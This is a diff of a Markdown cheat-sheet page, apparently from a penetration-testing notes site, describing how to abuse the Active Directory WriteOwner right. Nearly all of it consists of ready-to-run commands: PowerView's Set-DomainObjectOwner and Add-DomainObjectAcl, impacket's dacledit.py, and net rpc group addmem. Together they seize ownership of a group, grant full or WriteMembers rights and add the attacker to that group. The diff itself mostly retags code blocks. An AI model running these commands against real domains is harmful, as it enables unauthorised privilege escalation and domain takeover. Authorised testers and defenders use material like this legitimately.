@@ -4,7 +4,6 @@ date: 2024-7-27
 tags: ["WriteOwner", "active driectory", "ad", "Windows", "own", "dacledit"]
 ---
 
----
 ### Abuse #1 : Change owner of the group
 
 {{< tab set1 tab1 active >}}Windows{{< /tab >}}
@@ -14,7 +13,7 @@ tags: ["WriteOwner", "active driectory", "ad", "Windows", "own", "dacledit"]
 
 <div>
 
-```powershell
+```console
 . .\PowerView.ps1
 ```
 
@@ -24,7 +23,7 @@ tags: ["WriteOwner", "active driectory", "ad", "Windows", "own", "dacledit"]
 
 <div>
 
-```powershell
+```console
 Set-DomainObjectOwner -Identity <TARGET_GROUP> -OwnerIdentity <USER>
 ```
 
@@ -42,15 +41,15 @@ Set-DomainObjectOwner -Identity <TARGET_GROUP> -OwnerIdentity <USER>
 
 <div>
 
-```bash
+```console
 git clone https://github.com/fortra/impacket.git
 ```
 
-```bash
+```console
 cd impacket
 ```
 
-```bash
+```console
 pip3 install .
 ```
 
@@ -60,7 +59,7 @@ pip3 install .
 
 <div>
 
-```bash
+```console
 sudo ntpdate -s <DC> && dacledit.py -k '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC> -principal <USER> -target <TARGET_GROUP> -action write -rights WriteMembers
 ```
 
@@ -70,11 +69,11 @@ sudo ntpdate -s <DC> && dacledit.py -k '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC> 
 
 <div>
 
-```bash
+```console
 kinit <USER>
 ```
 
-```bash
+```console
 sudo ntpdate -s <DC> && net rpc group addmem <TARGET_GROUP> <USER> -U <USER> --use-kerberos=required -S <DC> --no-pass
 ```
 
@@ -84,7 +83,7 @@ sudo ntpdate -s <DC> && net rpc group addmem <TARGET_GROUP> <USER> -U <USER> --u
 
 <div>
 
-```bash
+```console
 sudo ntpdate -s <DC> && net rpc group members <TARGET_GROUP> -U <USER> --use-kerberos=required -S <DC> --no-pass
 ```
 
@@ -97,7 +96,7 @@ sudo ntpdate -s <DC> && net rpc group members <TARGET_GROUP> -U <USER> --use-ker
 
 <div>
 
-```powershell
+```console
 . .\PowerView.ps1
 ```
 
@@ -107,15 +106,15 @@ sudo ntpdate -s <DC> && net rpc group members <TARGET_GROUP> -U <USER> --use-ker
 
 <div>
 
-```powershell
-$username = "<DOMAIN>\<USER>"
+```console
+$username = '<DOMAIN>\<USER>'
 ```
 
-```powershell
-$password = ConvertTo-SecureString <PASSWORD> -AsPlainText -Force
+```console
+$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
 ```
 
-```powershell
+```console
 $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
 ```
 
@@ -125,11 +124,11 @@ $cred = new-object -typename System.Management.Automation.PSCredential -argument
 
 <div>
 
-```powershell
+```console
 Add-DomainObjectAcl -TargetIdentity <TARGET_GROUP> -PrincipalIdentity '<DOMAIN>/<USER>' -Rights All -DomainController <DC> -Credential $cred
 ```
 
-```powershell
+```console
 Add-DomainGroupMember -Identity <TARGET_GROUP> -Members <USER> -Credential $cred
 ```
 
@@ -139,16 +138,16 @@ Add-DomainGroupMember -Identity <TARGET_GROUP> -Members <USER> -Credential $cred
 
 <div>
 
-```powershell
+```console
 Get-DomainGroupMember -Identity <TARGET_GROUP> -Domain <DOMAIN> -DomainController <DC> -Credential $cred | fl MemberName
 ```
 
-```powershell
+```console
 # Or
 net user <USER>
 ```
 
-```powershell
+```console
 # Exit current sessions or re-login
 whoami /groups
 ```
